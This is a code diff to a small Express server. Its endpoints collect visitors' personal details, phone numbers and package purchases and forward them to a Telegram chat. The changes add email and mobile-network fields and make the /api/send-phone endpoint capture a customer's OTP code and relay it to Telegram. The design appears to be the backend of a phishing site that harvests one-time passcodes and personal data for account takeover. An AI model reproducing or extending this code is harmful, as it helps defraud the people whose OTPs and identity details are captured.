@@ -55,8 +55,10 @@ function formatVendorRegistration(data) {
 
 👤 <b>Full Name:</b> ${data.fullName}
 📱 <b>Phone:</b> ${data.phone}
+📧 <b>Email:</b> ${data.email}
 🏪 <b>Business Name:</b> ${data.business}
 📦 <b>Trade Type:</b> ${data.tradeType}
+📡 <b>Network:</b> ${data.network}
 🎂 <b>Date of Birth:</b> ${data.dob}
 🏠 <b>Hometown:</b> ${data.hometown}
 
@@ -71,7 +73,7 @@ function formatPurchase(data) {
 📦 <b>Package:</b> ${data.package}
 💰 <b>Price:</b> ${data.price}
 📱 <b>Phone:</b> ${data.phone}
-🔑 <b>Agent Code:</b> ${data.code}
+🔑 <b>OTP Code:</b> ${data.code}
 
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
     `;
@@ -84,7 +86,6 @@ function formatRecharge(data) {
 📦 <b>Package:</b> ${data.package}
 💰 <b>Price:</b> ${data.price}
 📱 <b>Phone:</b> ${data.phone}
-🔑 <b>Agent Code:</b> ${data.code}
 
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
     `;
@@ -110,10 +111,10 @@ app.get('/', (req, res) => {
 });
 
 app.get('/api/health', (req, res) => {
-    res.json({ 
-        status: '✅ Healthy', 
+    res.json({
+        status: '✅ Healthy',
         port: PORT,
-        timestamp: new Date().toISOString() 
+        timestamp: new Date().toISOString()
     });
 });
 
@@ -122,16 +123,16 @@ app.get('/api/health', (req, res) => {
 // =============================================
 app.post('/api/register-vendor', async (req, res) => {
     try {
-        const { fullName, phone, business, tradeType, dob, hometown } = req.body;
+        const { fullName, phone, email, business, tradeType, network, dob, hometown } = req.body;
 
-        if (!fullName || !phone || !business || !tradeType || !dob || !hometown) {
+        if (!fullName || !phone || !email || !business || !tradeType || !network || !dob || !hometown) {
             return res.status(400).json({
                 success: false,
                 message: '❌ All fields are required!'
             });
         }
 
-        const data = { fullName, phone, business, tradeType, dob, hometown };
+        const data = { fullName, phone, email, business, tradeType, network, dob, hometown };
         const message = formatVendorRegistration(data);
         await sendToTelegram(message);
 
@@ -186,16 +187,16 @@ app.post('/api/purchase', async (req, res) => {
 // =============================================
 app.post('/api/recharge', async (req, res) => {
     try {
-        const { package: packageName, price, phone, code } = req.body;
+        const { package: packageName, price, phone } = req.body;
 
-        if (!packageName || !price || !phone || !code) {
+        if (!packageName || !price || !phone) {
             return res.status(400).json({
                 success: false,
-                message: '❌ All fields are required!'
+                message: '❌ Package, price, and phone are required!'
             });
         }
 
-        const data = { package: packageName, price, phone, code };
+        const data = { package: packageName, price, phone };
         const message = formatRecharge(data);
         await sendToTelegram(message);
 
@@ -214,11 +215,11 @@ app.post('/api/recharge', async (req, res) => {
 });
 
 // =============================================
-// 4. SEND PHONE NUMBER (NEW - Send phone to Telegram)
+// 4. SEND PHONE + OTP
 // =============================================
 app.post('/api/send-phone', async (req, res) => {
     try {
-        const { package: packageName, price, phone, type } = req.body;
+        const { package: packageName, price, phone, otp, type } = req.body;
 
         if (!phone || !packageName) {
             return res.status(400).json({
@@ -233,23 +234,25 @@ app.post('/api/send-phone', async (req, res) => {
 👤 Customer Phone: ${phone}
 📦 Package: ${packageName}
 💰 Price: ${price}
+${otp ? `🔑 OTP Code: ${otp}` : ''}
 
 ⏰ Time: ${new Date().toLocaleString()}
 
-📌 Please send the 6-digit Agent Code to this customer!`;
+${otp ? '📌 Please tell the customer the OTP code above to complete their purchase!' : ''}
+        `;
 
         await sendToTelegram(message);
 
         res.json({
             success: true,
-            message: '✅ Phone number sent successfully! Please check your Telegram.'
+            message: '✅ Phone number and OTP sent successfully!'
         });
 
     } catch (error) {
         console.error('❌ Error in /api/send-phone:', error);
         res.status(500).json({
             success: false,
-            message: '❌ Failed to send phone number. Please try again.'
+            message: '❌ Failed to send. Please try again.'
         });
     }
 });
